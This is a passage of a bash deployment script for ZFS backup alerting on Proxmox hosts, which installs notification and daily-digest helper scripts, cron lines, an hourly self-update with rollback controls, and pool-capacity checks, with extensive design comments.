    [ -e "$NOTIFY_SCRIPT" ] && log "$NOTIFY_SCRIPT exists but predates v4 -- upgrading (no more immediate mail; queues into the daily digest)"
    cat > "$NOTIFY_SCRIPT" <<EOF
#!/bin/bash
$NOTIFY_SCRIPT_MARKER -- reports an ALERT-tier finding: a cron job that returned
# non-zero, a CRITICAL/UNKNOWN staleness result, or a DEGRADED/FAULTED pool.
#
# WHETHER IT MAILS NOW OR WAITS FOR THE DAILY DIGEST IS CONFIGURED, NOT BAKED IN.
# Set ZFS_ALERT_MODE in /root/scripts/zfs-alert.conf:
#   daily      (default) queue it; alert-digest.sh sends one mail a day
#   immediate  mail it right now, rate-limited per message via
#              ZFS_ALERT_COOLDOWN. Recommended while bringing a host up.
# A finding is reported through exactly one of the two paths, never both.
#
# Why daily is the default: the immediate path's cooldown is keyed on the
# MESSAGE, so every distinct finding keeps its own counter and two jobs failing
# in the same cron tick send two mails in the same second. Volume then scales
# with the number of distinct findings rather than with hosts, and an operator
# who filters that away is worse off than one who reads a single daily summary.
#
# Either way Proxmox's own ZED pool-health mail is untouched, so a disk actually
# dropping out still pages immediately through that separate path.
# Usage in cron:
#   ... || /root/scripts/notify-fail.sh "job description" "what it actually said"
#
# The SECOND argument is the finding itself: the failing command's own output, or
# check-snap-age.sh's verdict line carrying the real dataset, age and thresholds.
# Without it the digest can only report that something called "pve0 hourly backup
# (vm-101)" went wrong -- a label from the config, nothing anyone can act on --
# while the actual text went to cron.log where nobody reads it. Optional, so cron
# lines generated before v4.16 keep working unchanged.
JOB="\$1"
DETAIL="\${2:-}"
$ALERT_ENV_PREAMBLE

MODE="\${ZFS_ALERT_MODE:-daily}"
QUEUE="\${ZFS_ALERT_QUEUE:-/var/lib/zfs-snapshot-all/alert-queue.log}"
EMAIL="\${ZFS_ALERT_EMAIL:-${NOTIFY_EMAIL}}"

if [ "\$MODE" != "immediate" ]; then
    # One line per finding: epoch, severity, text. Short single-line appends to
    # the same file from concurrent cron jobs do not interleave (under PIPE_BUF).
    # 0002, so that if THIS process is the one that recreates the queue after
    # the digest consumed it, the file lands group-writable. Both root and the
    # delegated account append here; whichever gets there first would otherwise
    # create it 0644 and lock the other one out until the next digest run.
    umask 0002
    # Four tab-separated columns now: epoch, severity, label, detail. A finding
    # has to stay ONE line -- concurrent appends from separate cron jobs are only
    # atomic while each write is a single short line (PIPE_BUF) -- so the detail
    # is flattened: tabs to spaces so the field split survives, newlines to \001,
    # which alert-digest.sh turns back into newlines. A control byte rather than
    # a backslash escape, because nothing in a ZFS error message can collide
    # with it and there is no un-escaping to get wrong.
    DETAIL_FLAT=\$(printf '%s' "\$DETAIL" | tr '\t' ' ' | tr '\n' '\001')
    printf '%s\tALERT\t%s\t%s\n' "\$(date +%s)" "\$JOB" "\$DETAIL_FLAT" >> "\$QUEUE"
    exit 0
fi

HOST=\$(hostname -f 2>/dev/null || hostname)
NOW=\$(date '+%Y-%m-%d %H:%M:%S')
NOW_EPOCH=\$(date +%s)
STATE_DIR="\${ZFS_ALERT_STATE_DIR:-/var/lib/zfs-snapshot-all/notify-state}"
COOLDOWN="\${ZFS_ALERT_COOLDOWN:-14400}"
mkdir -p "\$STATE_DIR"

KEY=\$(printf '%s' "\$JOB" | md5sum | cut -d' ' -f1)
LASTFILE="\$STATE_DIR/\$KEY"
if [ -f "\$LASTFILE" ] && [ \$(( NOW_EPOCH - \$(cat "\$LASTFILE") )) -lt "\$COOLDOWN" ]; then
    # stderr, so the cron line's own 2>>cron.log swallows it. Unredirected, this
    # single line was itself a cron mail on every tick -- 96/day per monitor.
    echo "notify-fail.sh: suppressed repeat within cooldown -- \${JOB}" >&2
    exit 0
fi
echo "\$NOW_EPOCH" > "\$LASTFILE"

{
    printf "ZFS alert: '%s' na %s o %s.\n" "\${JOB}" "\${HOST}" "\${NOW}"
    if [ -n "\$DETAIL" ]; then
        printf '\nCo zglosilo zadanie:\n\n'
        printf '%s\n' "\$DETAIL" | sed 's/^/    /'
    fi
    printf '\nPelny log: /root/scripts/cron.log na %s\n' "\${HOST}"
} | mail -s "[ZFS BACKUP] ALERT: \${JOB} na \${HOST}" "\$EMAIL"
EOF
    chmod +x "$NOTIFY_SCRIPT"
    log "created/upgraded $NOTIFY_SCRIPT (v4, queues -> alert-digest.sh)"
fi

# The delivery smoke test used to run on EVERY invocation. Re-running deploy.sh
# is the normal way to upgrade the alert scripts, so every upgrade sent one mail
# per host: four hosts upgraded three times in an afternoon put twelve messages
# in the operator's inbox, none of which said anything about backups. That is
# the very mailbox the one-mail-per-day rule exists to protect.

# The verdict runs in EVERY mode, before the send decision: --check-only exists
# to answer "is this host healthy", and "its alerts cannot leave the building"
# belongs in that answer even though nothing is being installed. It is also the
# only report a host gets on a re-run, where the test mail is deliberately
# skipped.
alert_delivery_verdict || true

if [ "$CHECK_ONLY" -eq 1 ]; then
    log "skipping the test email (check-only)"
elif [ "$SEND_TEST_MAIL" -eq 0 ] && [ "$FIRST_TIME_SETUP" -eq 0 ]; then
    log "skipping the test email (host already set up -- pass --test-mail to force one)"
elif command -v mail >/dev/null; then
    alert_delivery_probe "$NOTIFY_EMAIL" || true
else
    warn "no 'mail' command -- install mailutils/postfix, then re-run this script, or create $NOTIFY_SCRIPT manually"
fi

# ------------------------------------------------------------------------------
log "Phase 4a: notify-warn.sh + alert-digest.sh (the daily digest)"
# ------------------------------------------------------------------------------
# Companion to notify-fail.sh: CRITICAL/BROKEN monitor findings still mail
# immediately (rate-limited, Part 4 above). WARNING findings ("getting stale",
# past monitor_warn but not yet monitor_crit) are not urgent enough to
# interrupt anyone, so notify-warn.sh only queues them; alert-digest.sh mails
# one summary per day and is silent if nothing queued. gen-cron.sh wires both
# into the crontab on its own (WARN_SCRIPT/DIGEST_SCRIPT/DIGEST_SCHEDULE) --
# this part only makes sure the two scripts exist on disk.
WARN_SCRIPT="/root/scripts/notify-warn.sh"
WARN_SCRIPT_MARKER="# notify-warn.sh v7"
if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ ! -x "$WARN_SCRIPT" ]; then
        warn "  $WARN_SCRIPT missing -- WARNING monitor lines would error out"
    elif grep -qF "$WARN_SCRIPT_MARKER" "$WARN_SCRIPT" 2>/dev/null; then
        log "  $WARN_SCRIPT present (current)"
    else
        warn "  $WARN_SCRIPT present but outdated (wrong queue path) -- re-run without --check-only to upgrade"
    fi
elif [ -e "$WARN_SCRIPT" ] && grep -qF "$WARN_SCRIPT_MARKER" "$WARN_SCRIPT" 2>/dev/null; then
    log "$WARN_SCRIPT already current, leaving it alone"
else
    cat > "$WARN_SCRIPT" <<EOF
#!/bin/bash
$WARN_SCRIPT_MARKER -- reports a WARNING-tier monitor finding ("getting stale",
# past monitor_warn but not yet monitor_crit).
#
# Same queue and same line format as notify-fail.sh, differing only in the
# severity column -- that is what lets one digest cover both tiers in one mail.
# Controlled by ZFS_WARN_MODE in /root/scripts/zfs-alert.conf, separately from
# ZFS_ALERT_MODE: daily (default) or immediate. Leave it on daily unless you
# have a specific reason -- warnings are by definition the findings that are not
# urgent, so mailing them on sight is the fastest way to train someone to ignore
# the mailbox.
# Usage in cron:
#   ... ; [ \$rc -eq 1 ] && /root/scripts/notify-warn.sh "label" "\$verdict"
# The second argument is check-snap-age.sh's own verdict line -- dataset,
# pattern, newest snapshot, actual age, thresholds. See notify-fail.sh for why a
# label alone is not enough to act on.
JOB="\$1"
DETAIL="\${2:-}"
$ALERT_ENV_PREAMBLE

QUEUE="\${ZFS_ALERT_QUEUE:-/var/lib/zfs-snapshot-all/alert-queue.log}"
if [ "\${ZFS_WARN_MODE:-daily}" = "immediate" ]; then
    HOST=\$(hostname -f 2>/dev/null || hostname)
    {
        printf "ZFS warning: '%s' na %s o %s.\n" "\${JOB}" "\${HOST}" "\$(date '+%Y-%m-%d %H:%M:%S')"
        [ -n "\$DETAIL" ] && { printf '\nCo zglosil monitor:\n\n'; printf '%s\n' "\$DETAIL" | sed 's/^/    /'; }
    } | mail -s "[ZFS BACKUP] WARNING: \${JOB} na \${HOST}" "\${ZFS_ALERT_EMAIL:-${NOTIFY_EMAIL}}"
    exit 0
fi
# See notify-fail.sh: keep a recreated queue writable by BOTH accounts.
umask 0002
DETAIL_FLAT=\$(printf '%s' "\$DETAIL" | tr '\t' ' ' | tr '\n' '\001')
printf '%s\tWARN\t%s\t%s\n' "\$(date +%s)" "\$JOB" "\$DETAIL_FLAT" >> "\$QUEUE"
EOF
    chmod +x "$WARN_SCRIPT"
    log "created/upgraded $WARN_SCRIPT (v2, shared queue)"
fi

DIGEST_SCRIPT="/root/scripts/alert-digest.sh"
DIGEST_SCRIPT_MARKER="# alert-digest.sh v9"
if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ ! -x "$DIGEST_SCRIPT" ]; then
        warn "  $DIGEST_SCRIPT missing -- findings would queue forever and never be seen"
    elif grep -qF "$DIGEST_SCRIPT_MARKER" "$DIGEST_SCRIPT" 2>/dev/null; then
        log "  $DIGEST_SCRIPT present (current)"
    else
        warn "  $DIGEST_SCRIPT present but outdated (wrong queue path, or WARN-only) -- re-run without --check-only to upgrade"
    fi
elif [ -e "$DIGEST_SCRIPT" ] && grep -qF "$DIGEST_SCRIPT_MARKER" "$DIGEST_SCRIPT" 2>/dev/null; then
    log "$DIGEST_SCRIPT already current, leaving it alone"
else
    cat > "$DIGEST_SCRIPT" <<EOF
#!/bin/bash
$DIGEST_SCRIPT_MARKER -- THE only mail this host sends about backups. Once a day
# it summarises everything notify-fail.sh (ALERT) and notify-warn.sh (WARN)
# queued since the last run, in ONE message, and is completely silent on a day
# with nothing to report.
#
# One mail per host per day is the whole point: at fleet scale the previous
# design (immediate mail per finding, rate-limited per message text) produced
# mail proportional to the number of distinct findings, so two jobs failing in
# the same cron tick sent two mails in the same second. An operator who filters
# the alerting away is worse off than one who reads a single daily summary.
#
# A silent day means "nothing was queued" -- it does NOT prove the host is
# healthy, since a dead cron would also be silent. That gap is closed once a
# week rather than daily: see the heartbeat below. A daily "all OK" from every
# host is exactly the noise this design replaced, but a weekly one is cheap and
# is the only thing that distinguishes a quiet host from a mute one.
$ALERT_ENV_PREAMBLE

QUEUE="\${ZFS_ALERT_QUEUE:-/var/lib/zfs-snapshot-all/alert-queue.log}"
LEGACY_QUEUE="/root/scripts/warn-queue.log"
HOST=\$(hostname -f 2>/dev/null || hostname)
TODAY=\$(date '+%Y-%m-%d')

PROCESSING="\${QUEUE}.processing"

# Claim the queue first, so findings arriving mid-run land in the NEXT digest
# rather than being summarised and then deleted unread.
if [ -s "\$QUEUE" ]; then
    mv "\$QUEUE" "\$PROCESSING"
else
    : > "\$PROCESSING"
fi

# One-time carry-over: anything left by notify-warn.sh v1, which wrote a
# two-column line (epoch, message) to a separate file. Normalised to WARN so a
# host upgraded mid-day does not silently drop what it had already queued.
if [ -s "\$LEGACY_QUEUE" ]; then
    awk -F'\t' 'NF>=2 { printf "%s\tWARN\t%s\n", \$1, \$2 }' "\$LEGACY_QUEUE" >> "\$PROCESSING"
    rm -f "\$LEGACY_QUEUE"
fi

# A WEEK WITH NOTHING TO SAY MUST STILL SAY IT.
#
# Until now an empty queue meant no mail, and that made silence carry no
# information at all. Measured on pve9, 2026-08-22: its MTA was local-delivery
# only and its digest was not even scheduled, so it had reported NOTHING for
# months -- and from the owner's inbox that looked exactly like a host with no
# findings. Three real messages, one of them a genuine digest naming 2 alerts
# and 1 warning, were sitting in /var/mail on the host itself.
#
# So once a week, on Monday, a host with nothing to report says so. One line,
# one mail per host per week. The point is not the content: it is that from
# Monday onward, NO mail is itself the alarm -- and it is an alarm the owner
# notices without checking anything.
#
# Stateless on purpose. No "last heartbeat" file to go stale, drift, or be
# restored from a backup: the weekday IS the schedule. A Monday that already
# has findings sends the ordinary digest instead, which proves the same path
# just as well.
if [ ! -s "\$PROCESSING" ]; then
    rm -f "\$PROCESSING"
    [ "\$(date +%u)" = "1" ] || exit 0
    # The heartbeat's ONLY job is to prove the channel carries, so it must not
    # report success when the send failed. The first cut piped into mail and
    # then exited 0 unconditionally -- a broken MTA would have produced a
    # cheerful "channel fine" exit while nothing left the host, which is the
    # exact failure the heartbeat exists to expose, wearing the heartbeat's own
    # clothes. Caught in review.
    if printf 'Host: %s   %s

Brak zdarzen w minionym tygodniu.

Ten list jest dowodem, ze droga alertu na tym hoscie dziala.
Jesli w kolejny poniedzialek nie przyjdzie -- to jest alarm.
'         "\$HOST" "\$TODAY"         | mail -s "[ZFS] \$HOST \$TODAY -- cisza, kanal sprawny" "\${ZFS_ALERT_EMAIL:-${NOTIFY_EMAIL}}"; then
        exit 0
    fi
    echo "alert-digest.sh: weekly heartbeat could not be sent -- the alert channel on this host is NOT proven" >&2
    exit 1
fi

# Collapse to one row per (severity, message): count, first-seen, last-seen.
# Sorted ALERT before WARN, then by count descending -- the worst and the
# noisiest end up at the top of the mail where they get read.
# The fourth column (detail) is what the finding actually SAID -- the failing
# command's output, or the monitor's verdict with the real age and thresholds.
# Kept from the LAST occurrence: for a condition repeating every 15 minutes the
# most recent reading is the one that describes the state now. Lines queued
# before v8/v6 have no fourth column and simply carry no detail.
SUMMARY=\$(awk -F'\t' '
{
    sev = \$2; if (sev != "ALERT") sev = "WARN"
    key = sev "\t" \$3
    count[key]++
    if (!(key in first) || \$1 < first[key]) first[key] = \$1
    if (!(key in last)  || \$1 > last[key])  { last[key] = \$1; detail[key] = \$4 }
}
END {
    for (k in count) {
        split(k, p, "\t")
        rank = (p[1] == "ALERT") ? 0 : 1
        printf "%d\t%s\t%d\t%s\t%d\t%d\t%s\n", rank, p[1], count[k], p[2], first[k], last[k], detail[k]
    }
}' "\$PROCESSING" | sort -t\$'\t' -k1,1n -k3,3nr)

ALERT_BODY=""
WARN_BODY=""
N_ALERT=0
N_WARN=0
while IFS=\$'\t' read -r rank sev cnt msg first_ep last_ep detail; do
    [ -n "\$sev" ] || continue
    t1=\$(date -d "@\$first_ep" '+%H:%M')
    t2=\$(date -d "@\$last_ep" '+%H:%M')
    range="\$t1"; [ "\$t1" != "\$t2" ] && range="\$t1 - \$t2"
    line=\$(printf '  x%-4s %-55s (%s)' "\$cnt" "\$msg" "\$range")
    # Unflatten and indent under the heading it belongs to. \001 went in where
    # the newlines were; a multi-line failure comes back out as multiple lines.
    #
    # A row with NO detail says so, rather than just looking thin: silence there
    # is ambiguous -- it could be an entry queued before the detail existed, or
    # a caller that forgot to pass it -- and the reader cannot tell which.
    if [ -n "\$detail" ]; then
        line="\$line
\$(printf '%s' "\$detail" | tr '\001' '\n' | sed 's/^/        /')"
    else
        line="\$line
        (bez szczegolow -- wpis zakolejkowany przed przebudowa alertow)"
    fi
    if [ "\$sev" = "ALERT" ]; then
        N_ALERT=\$((N_ALERT + 1))
        ALERT_BODY="\${ALERT_BODY}\${line}
"
    else
        N_WARN=\$((N_WARN + 1))
        WARN_BODY="\${WARN_BODY}\${line}
"
    fi
done <<< "\$SUMMARY"

TOTAL=\$(wc -l < "\$PROCESSING")

if {
    printf 'Host: %s   Doba: %s   Zdarzen: %s\n' "\$HOST" "\$TODAY" "\$TOTAL"
    if [ "\$N_ALERT" -gt 0 ]; then
        printf '\nALERT -- zadanie padlo, backup przeterminowany albo pula nie jest ONLINE:\n\n%s' "\$ALERT_BODY"
    fi
    if [ "\$N_WARN" -gt 0 ]; then
        printf '\nWARNING -- starzeje sie, jeszcze nie critical:\n\n%s' "\$WARN_BODY"
    fi
    printf '\nSzczegoly: /root/scripts/cron.log na %s\n' "\$HOST"
} | mail -s "[ZFS] \$HOST \$TODAY -- \$N_ALERT alert / \$N_WARN warn" "\${ZFS_ALERT_EMAIL:-${NOTIFY_EMAIL}}"; then
    rm -f "\$PROCESSING"
else
    # Mail failed (no MTA, relay refused, mailutils missing). Put the findings
    # back so the next run retries them: this is the ONLY copy, and the whole
    # point of a once-a-day digest is that a lost run is a lost DAY of alerting.
    # Deleting on failure is what the v1 digest did, and it silently discarded
    # everything queued whenever delivery broke.
    (umask 0002; cat "\$PROCESSING" >> "\$QUEUE") 2>/dev/null && rm -f "\$PROCESSING"
    echo "alert-digest.sh: mail delivery failed -- \$TOTAL finding(s) requeued for the next run" >&2
    exit 1
fi
EOF
    chmod +x "$DIGEST_SCRIPT"
    log "created/upgraded $DIGEST_SCRIPT (v2, one mail/day covering ALERT+WARN)"
fi

# The digest's cron line belongs HERE, in the host block, not in a relationship's
# generated block. Found live on pve9, 2026-08-22: 15 findings had been queued
# since the previous day and `alert-digest` appeared in ZERO crontabs, so nothing
# was ever going to drain them.
#
# The cause was a boundary, not a bug in any one line. gen-cron.sh emitted the
# digest inside the block it generates for a relationship, and only when that
# block had monitor lines. The design around it is right and unchanged -- ONE
# digest per host, run by root, reading the queue BOTH accounts write, and a
# delegated account deliberately opting out because alert-digest.sh is never
# copied to it. But put those together and a host whose only relationship lives
# in a delegated account has every party correctly declining to schedule it.
# pve9 is exactly that host, and the fleet has been moving that way since the
# root -> delegated-account migration.
#
# So: the digest is a HOST-level job, like the capacity check and the auto-pull
# beside it, and it is installed the same way -- adopt, not ensure, so an
# operator who moved it to 06:00 keeps 06:00; only the line's LOCATION is this
# run's business. This also collapses the other half of the same boundary: pve1
# carried the line TWICE (a residual copy here from an older deploy plus the
# generated one), two runs at 07:00 racing for the same queue file.
DIGEST_LINE="0 7 * * * $DIGEST_SCRIPT 2>>/root/scripts/cron.log"
if [ "$CHECK_ONLY" -eq 1 ]; then
    if ! crontab -l 2>/dev/null | grep -qF "$DIGEST_SCRIPT"; then
        warn "digest cron line MISSING -- findings would queue forever and nobody would ever be told"
    elif ! crontab -l 2>/dev/null | sed -n "/^# BEGIN $CRON_HOST_BLOCK/,/^# END $CRON_HOST_BLOCK/p" | grep -qF "$DIGEST_SCRIPT"; then
        warn "digest cron line is present but LOOSE, outside the '$CRON_HOST_BLOCK' block -- a plain run adopts it into the block, keeping its current schedule"
    else
        log "digest cron line already in the '$CRON_HOST_BLOCK' block"
    fi
else
    if cron_block_adopt_line root "$CRON_HOST_BLOCK" "$DIGEST_SCRIPT" "$DIGEST_LINE" "$CRON_HOST_TAIL"; then
        if [ "${CRON_CHANGED:-0}" -eq 0 ]; then
            log "digest cron line already in the '$CRON_HOST_BLOCK' block, leaving it alone"
        elif [ "${CRON_ADOPTED:-0}" -gt 0 ]; then
            log "moved the digest cron line into the '$CRON_HOST_BLOCK' block (schedule unchanged)"
        else
            log "added digest cron line: $DIGEST_LINE"
        fi
    else
        warn "could not install the digest cron line: $CRON_ERR -- findings will queue and nobody will be told"
    fi
fi

# ------------------------------------------------------------------------------
log "Phase 7: auto-pull cron line (keeps this host's copy in sync with GitHub)"
# ------------------------------------------------------------------------------
# This host follows the moving `main` branch, hourly, and the backup jobs then
# run whatever that pull brought in, as root. That is REV-20260729-001 F4, and
# the owner has accepted it deliberately: the alternative -- pinning production
# to a tag -- costs a manual step on every fix, and this fleet is administered
# from a phone. Hand-copying scripts instead has already broken --ff-only here
# once, permanently, on one host.
#
# What the finding asked for and is NOT waived: knowing which revision is live,
# and being able to go back and STAY back. Both live in --self-update /
# --rollback / --resume-updates above; cron just calls the first one.
#
# REV-20260730-001 F1: cron must invoke a copy of the update-control logic
# that a rollback of $REPO_DIR cannot touch. Deploy update-control.sh (repo
# root) into $UPDATE_STATE_DIR -- root-private, outside $REPO_DIR -- and point
# the cron line at THAT copy once it exists. Never done under --check-only
# (nothing is installed/modified in that mode).
UPDATE_CONTROL_SRC="$REPO_DIR/update-control.sh"
UPDATE_CONTROL_DEPLOYED=0
if [ "$CHECK_ONLY" -eq 1 ]; then
    [ -x "$DEPLOYED_UPDATE_CONTROL" ] || warn "update-control.sh not yet deployed to $DEPLOYED_UPDATE_CONTROL -- re-run without --check-only so rollback stays enforced across a future version-boundary rollback (REV-20260730-001 F1)"
elif [ -r "$UPDATE_CONTROL_SRC" ]; then
    if ensure_update_state_dir; then
        _uc_tmp=$(mktemp "$UPDATE_STATE_DIR/.tmp.XXXXXX" 2>/dev/null)
        if [ -n "$_uc_tmp" ] \
            && sed -e "s#__REPO_DIR__#$REPO_DIR#g" -e "s#__UPDATE_STATE_DIR__#$UPDATE_STATE_DIR#g" "$UPDATE_CONTROL_SRC" > "$_uc_tmp" 2>/dev/null \
            && chmod 0700 "$_uc_tmp" \
            && mv -f "$_uc_tmp" "$DEPLOYED_UPDATE_CONTROL" 2>/dev/null; then
            UPDATE_CONTROL_DEPLOYED=1
            log "deployed update-control.sh to $DEPLOYED_UPDATE_CONTROL"
        else
            rm -f "$_uc_tmp" 2>/dev/null
            warn "could not deploy update-control.sh to $DEPLOYED_UPDATE_CONTROL -- automatic updates will keep using the bootstrap logic built into $REPO_DIR/deploy.sh, which a rollback CAN revert (REV-20260730-001 F1)"
        fi
    else
        warn "could not deploy update-control.sh -- $UPDATE_STATE_DIR is not safe to use (see above)"
    fi
else
    warn "$UPDATE_CONTROL_SRC not found in this checkout -- automatic updates will keep using the bootstrap logic built into deploy.sh (older revision checked out?)"
fi
[ -x "$DEPLOYED_UPDATE_CONTROL" ] && [ ! -L "$DEPLOYED_UPDATE_CONTROL" ] && UPDATE_CONTROL_DEPLOYED=1

if [ "$UPDATE_CONTROL_DEPLOYED" -eq 1 ]; then
    PULL_LINE="15 * * * * $DEPLOYED_UPDATE_CONTROL --self-update >>/root/scripts/git-pull.log 2>&1"
else
    PULL_LINE="15 * * * * $REPO_DIR/deploy.sh --self-update >>/root/scripts/git-pull.log 2>&1"
fi
# Matches every shape this line has ever had for THIS repo: the original bare
# `git pull`, the rev-parse-then-pull version from 75bf956, the deploy.sh-direct
# version, and the current update-control.sh-wrapper version -- scoped to
# $REPO_DIR/$UPDATE_STATE_DIR so it can never match an unrelated cron line that
# merely happens to contain the substring "--self-update" (REV-20260729-004
# F4: the previous version checked `grep -qF -- "--self-update"` globally,
# with no anchor at all).
is_this_repo_updater_line() {
    case "$1" in
        *"$REPO_DIR/deploy.sh --self-update"*) return 0 ;;
        *"$UPDATE_STATE_DIR/update-control.sh --self-update"*) return 0 ;;
        *"cd $REPO_DIR"*"git pull --ff-only origin main"*) return 0 ;;
    esac
    return 1
}
mapfile -t _existing_cron_lines < <(crontab -l 2>/dev/null)
_match_count=0
_exact_count=0
for _l in "${_existing_cron_lines[@]:-}"; do
    [ -n "$_l" ] || continue
    if is_this_repo_updater_line "$_l"; then
        _match_count=$((_match_count + 1))
        [ "$_l" = "$PULL_LINE" ] && _exact_count=$((_exact_count + 1))
    fi
done

# "Already current" now means current AND in the block. Without the second half
# the line on every existing host -- correct in content, loose in position --
# would take the leave-it-alone branch forever and never be adopted, which is
# the entire point of this slice.
_in_block=0
if crontab -l 2>/dev/null \
   | sed -n "/^# BEGIN $CRON_HOST_BLOCK/,/^# END $CRON_HOST_BLOCK/p" \
   | grep -qxF "$PULL_LINE"; then
    _in_block=1
fi

if [ "$_match_count" -eq 1 ] && [ "$_exact_count" -eq 1 ] && [ "$_in_block" -eq 1 ]; then
    log "auto-update cron line already current, in the '$CRON_HOST_BLOCK' block, leaving it alone"
elif [ "$CHECK_ONLY" -eq 1 ]; then
    if [ "$_match_count" -eq 0 ]; then
        warn "auto-update cron line MISSING -- this host would never pick up updates"
    elif [ "$_match_count" -eq 1 ] && [ "$_exact_count" -eq 1 ]; then
        warn "auto-update cron line is present and current but LOOSE, outside the '$CRON_HOST_BLOCK' block -- a plain run adopts it into the block"
    else
        warn "auto-update cron line needs normalization ($_match_count matching line(s) found, $_exact_count already exact) -- re-run without --check-only. Its rollback point is overwritten hourly if it is still the old bare-pull form, see REV-20260729-003."
    fi
else
    # Every matching line (old shapes, duplicates of the current shape, or a
    # mix) is dropped and exactly one current line is installed -- normalizing
    # to one, not leaving whichever shape happened to be checked first (F4:
    # the previous version left an old duplicate in place forever whenever a
    # current-shaped line already existed alongside it).
    #
    # ensure, not adopt: unlike the capacity line, the point here IS to rewrite.
    # The three historical spellings are listed so they are dropped wherever
    # they sit -- loose or already inside the block.
    _updater_shapes="$REPO_DIR/deploy.sh --self-update
cd $REPO_DIR && git pull --ff-only origin main"
    if cron_block_ensure_line root "$CRON_HOST_BLOCK" \
           "$UPDATE_STATE_DIR/update-control.sh --self-update" \
           "$PULL_LINE" "$CRON_HOST_TAIL" "$_updater_shapes"; then
        log "normalized auto-update cron line(s) ($_match_count found) to one current line in the '$CRON_HOST_BLOCK' block"
    else
        warn "could not install the auto-update cron line: $CRON_ERR -- this host would stop picking up updates"
    fi
fi
# The replacement lands at the END of the crontab, always AFTER gen-cron.sh's
# "# END zfs-backup-managed" marker, so the next `gen-cron.sh --install` -- which
# rewrites everything between the markers -- cannot wipe it. Verified on all
# four hosts.

# ---- which revision is actually live here ----
# F4's visibility half. Cheap, and it answers the question an operator actually
# has in front of a host: is this the code I think it is?
if [ -d "$REPO_DIR/.git" ]; then
    _rev=$(git -C "$REPO_DIR" rev-parse --short HEAD 2>/dev/null || echo '?')
    _subj=$(git -C "$REPO_DIR" log -1 --format=%s 2>/dev/null | cut -c1-60)
    log "active revision: $_rev  $_subj"
    if [ -n "$(git -C "$REPO_DIR" status --porcelain 2>/dev/null)" ]; then
        warn "the checkout at $REPO_DIR has LOCAL MODIFICATIONS -- the next fast-forward will fail and this host will silently stop updating"
    fi
    _behind=$(git -C "$REPO_DIR" rev-list --count HEAD..origin/main 2>/dev/null || echo 0)
    case "$_behind" in
        0) ;;
        *) log "$_behind commit(s) behind the last fetched origin/main -- the hourly update will catch up" ;;
    esac
    if [ -L "$UPDATE_HOLD_FILE" ] || [ -L "$PREV_REV_FILE" ]; then
        warn "update-control state at $UPDATE_STATE_DIR contains a symlink where a plain file is expected -- --self-update/--rollback/--resume-updates will all refuse to run until this is resolved by hand: ls -la $UPDATE_STATE_DIR"
    else
        if [ -e "$UPDATE_HOLD_FILE" ]; then
            warn "AUTOMATIC UPDATES ARE HELD: $(read_state_file "$UPDATE_HOLD_FILE")"
            warn "this host will not move until: bash $REPO_DIR/deploy.sh --resume-updates"
        fi
        if [ -f "$PREV_REV_FILE" ]; then
            log "rollback available to $(read_state_file "$PREV_REV_FILE" | cut -c1-8)  (bash $REPO_DIR/deploy.sh --rollback)"
        else
            log "no rollback point recorded yet -- the next real update records one"
        fi
    fi
    # Left over from 75bf956, which wrote this every hour whether anything
    # changed or not. Superseded by previous-revision; removed so nobody trusts
    # a name that never meant what it said.
    if [ -e "$ALERT_SHARED_DIR/last-known-good" ] && [ "$CHECK_ONLY" -eq 0 ]; then
        rm -f "$ALERT_SHARED_DIR/last-known-good"
        log "removed the stale last-known-good file (its value was overwritten hourly, see REV-20260729-003)"
    fi
fi

# ------------------------------------------------------------------------------
log "Phase 6a: single-instance lock sanity check (flock)"
# ------------------------------------------------------------------------------
TESTLOCK="/tmp/deploy_flock_test.$$"
( exec 200>"$TESTLOCK"; flock 200; sleep 3 ) &
HOLDER=$!
sleep 1
if ( exec 201>"$TESTLOCK"; flock -n 201 ); then
    warn "flock did NOT block a concurrent holder -- locking will not work as expected on this host/filesystem"
else
    log "flock correctly blocked a concurrent holder -- locking works"
fi
wait "$HOLDER" 2>/dev/null
rm -f "$TESTLOCK"

# ------------------------------------------------------------------------------
log "Phase 5: check-pool-capacity.sh (pool/quota capacity alerting)"
# ------------------------------------------------------------------------------
# Catches slow-fill pool/quota exhaustion BEFORE it turns into a job failure --
# notify-fail.sh only fires after a snapsend/delsnaps job has already broken.
# Added 2026-07-10 after a real incident: pve2's hdd pool hit 96% full and a
# fileserver LXC (subvol-101-disk-1) was independently at 91% of its own
# refquota, neither of which any existing alert would have caught in advance.
CAPACITY_SCRIPT="/root/scripts/check-pool-capacity.sh"
CAPACITY_SCRIPT_MARKER="# check-pool-capacity.sh v6"
if [ "$CHECK_ONLY" -eq 1 ]; then
    if [ ! -x "$CAPACITY_SCRIPT" ]; then
        warn "  $CAPACITY_SCRIPT missing -- no early warning before a pool fills up"
    elif grep -qF "$CAPACITY_SCRIPT_MARKER" "$CAPACITY_SCRIPT" 2>/dev/null; then
        log "  $CAPACITY_SCRIPT present (current)"
    else
        warn "  $CAPACITY_SCRIPT present but outdated (mails on its own instead of joining the daily digest) -- re-run without --check-only to upgrade"
    fi
elif [ -e "$CAPACITY_SCRIPT" ] && grep -qF "$CAPACITY_SCRIPT_MARKER" "$CAPACITY_SCRIPT" 2>/dev/null; then
    log "$CAPACITY_SCRIPT already current, leaving it alone"
else
    cat > "$CAPACITY_SCRIPT" <<EOF
#!/bin/bash
$CAPACITY_SCRIPT_MARKER -- warns before a zpool, or a dataset with a refquota,
# fills up. Catches slow exhaustion BEFORE it turns into a failed job.
#
# It reports through notify-fail.sh rather than mailing directly. Sending its
# own mail made it the one thing on the host that ignored the one-mail-per-day
# rule, and at fleet scale a second channel is a second thing to start
# filtering. Going through the queue also means the finding arrives with its
# numbers attached, in the same digest as everything else.
# Usage in cron: 0 8 * * * /root/scripts/check-pool-capacity.sh
THRESHOLD=90
HOST=\$(hostname -f 2>/dev/null || hostname)
NOTIFY="\${ZFS_NOTIFY_SCRIPT:-/root/scripts/notify-fail.sh}"

alert() {
    if [ -x "\$NOTIFY" ]; then
        "\$NOTIFY" "\$1" "\$2"
    else
        echo "\$2" | mail -s "[ZFS CAPACITY] \$1" "${NOTIFY_EMAIL}"
    fi
}

# THE PROBE IS ENUMERATED ONCE, AND ITS FAILURE IS A FINDING.
#
# \`for pool in \$(zpool list -H -o name)\` runs its body zero times when the
# enumeration fails, so the script says nothing -- and nothing is exactly what
# it says when every pool is healthy. "I could not look" then arrives at the
# operator as "I looked and all is well", which is the one failure mode this
# whole file exists to prevent (pve1's rpool sat DEGRADED for weeks because
# health was checked nowhere; a check that cannot fail loudly is checked
# nowhere too).
#
# Three outcomes, three different things to say:
